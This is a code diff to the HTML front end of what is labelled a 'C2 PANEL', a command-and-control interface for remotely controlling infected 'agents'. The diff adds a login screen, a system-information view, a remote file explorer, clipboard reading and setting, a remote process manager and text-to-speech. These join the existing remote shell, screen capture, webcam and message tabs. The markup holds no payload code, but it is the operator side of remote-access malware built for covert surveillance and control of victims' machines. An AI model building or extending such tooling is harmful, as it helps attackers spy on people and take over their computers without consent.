@@ -7,7 +7,19 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <div class="container">
+    <!-- Login Screen -->
+    <div class="login-screen" id="loginScreen">
+        <div class="login-box">
+            <div class="login-logo">⚡</div>
+            <h2>C2 PANEL</h2>
+            <p>Enter password to continue</p>
+            <input type="password" id="loginPassword" placeholder="Password" autocomplete="off">
+            <button class="btn btn-primary" onclick="attemptLogin()">Login</button>
+            <div class="login-error" id="loginError"></div>
+        </div>
+    </div>
+
+    <div class="container" id="mainContainer" style="display: none;">
         <!-- Sidebar -->
         <aside class="sidebar">
             <div class="logo">
@@ -32,6 +44,10 @@
                 <a href="#" class="nav-item" data-view="logs">
                     <span class="icon">📝</span>
                     <span>Logs</span>
+                </a>
+                <a href="#" class="nav-item" data-view="info">
+                    <span class="icon">📊</span>
+                    <span>System Info</span>
                 </a>
             </nav>
 
@@ -135,6 +151,16 @@
                     </div>
                 </div>
             </div>
+
+            <!-- System Info View -->
+            <div class="view" id="info">
+                <div class="info-container">
+                    <h2>System Information</h2>
+                    <div class="info-grid" id="infoGrid">
+                        <p class="empty-state">Select an agent to view system information</p>
+                    </div>
+                </div>
+            </div>
         </main>
     </div>
 
@@ -187,10 +213,13 @@
 
                 <!-- Tabs -->
                 <div class="tabs">
-                    <button class="tab active" data-tab="shell">Shell</button>
-                    <button class="tab" data-tab="screen">Screen</button>
-                    <button class="tab" data-tab="webcam">Webcam</button>
-                    <button class="tab" data-tab="message">Message</button>
+                    <button class="tab active" data-tab="shell">💻 Shell</button>
+                    <button class="tab" data-tab="screen">🖥️ Screen</button>
+                    <button class="tab" data-tab="webcam">📷 Webcam</button>
+                    <button class="tab" data-tab="message">💬 Message</button>
+                    <button class="tab" data-tab="files">📁 Files</button>
+                    <button class="tab" data-tab="system">⚙️ System</button>
+                    <button class="tab" data-tab="tts">🔊 TTS</button>
                 </div>
 
                 <!-- Tab Contents -->
@@ -257,10 +286,90 @@
                         <button class="btn btn-primary" onclick="sendMessageBox()">Send Message</button>
                     </div>
                 </div>
+
+                <div class="tab-content" id="files">
+                    <div class="files-panel">
+                        <h3>📂 File Explorer</h3>
+                        <div class="file-explorer">
+                            <div class="explorer-controls">
+                                <input type="text" id="currentPath" value="C:\\" class="path-input">
+                                <button class="btn btn-info" onclick="browsePath()">📂 Browse</button>
+                                <button class="btn btn-secondary" onclick="goUpDirectory()">⬆️ Up</button>
+                            </div>
+                            <div class="file-list" id="fileList">
+                                <p class="empty-state">Enter path and click Browse</p>
+                            </div>
+                        </div>
+                        <hr style="margin: 30px 0; border-color: var(--border);">
+                        <h3>📋 Clipboard Manager</h3>
+                        <div class="clipboard-manager">
+                            <div class="clipboard-view">
+                                <textarea id="clipboardContent" rows="6" placeholder="Clipboard content will appear here..." class="clipboard-area"></textarea>
+                                <div class="clipboard-controls">
+                                    <button class="btn btn-info" onclick="refreshClipboard()">🔄 Refresh</button>
+                                    <button class="btn btn-primary" onclick="setClipboard()">💾 Set Clipboard</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="system">
+                    <div class="system-panel">
+                        <h3>⚙️ Task Manager</h3>
+                        <div class="task-manager">
+                            <div class="task-controls">
+                                <button class="btn btn-info" onclick="refreshProcesses()">🔄 Refresh Processes</button>
+                                <input type="text" id="processSearch" placeholder="Search process..." class="process-search">
+                            </div>
+                            <div class="process-list" id="processList">
+                                <p class="empty-state">Click refresh to load processes</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="tts">
+                    <div class="tts-panel">
+                        <h3>🔊 Text-to-Speech</h3>
+                        <div class="tts-box">
+                            <textarea id="ttsText" rows="6" placeholder="Enter text to speak..." class="tts-textarea"></textarea>
+                            <div class="tts-controls">
+                                <select id="ttsVoice" class="tts-select">
+                                    <option value="default">Default Voice</option>
+                                    <option value="male">Male Voice</option>
+                                    <option value="female">Female Voice</option>
+                                </select>
+                                <button class="btn btn-primary" onclick="speakText()">🔊 Speak</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
     <script src="app.js"></script>
+
+    <!-- Notification Modal -->
+    <div class="notification-modal" id="notificationModal">
+        <div class="notification-content">
+            <div class="notification-icon" id="notifIcon">ℹ️</div>
+            <div class="notification-message" id="notifMessage">Notification</div>
+            <button class="notification-close" onclick="closeNotification()">OK</button>
+        </div>
+    </div>
+
+    <!-- Confirm Modal -->
+    <div class="notification-modal" id="confirmModal">
+        <div class="notification-content">
+            <div class="notification-icon">⚠️</div>
+            <div class="notification-message" id="confirmMessage">Are you sure?</div>
+            <div class="confirm-buttons">
+                <button class="btn btn-danger" onclick="confirmAction(true)">Yes</button>
+                <button class="btn btn-secondary" onclick="confirmAction(false)">Cancel</button>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
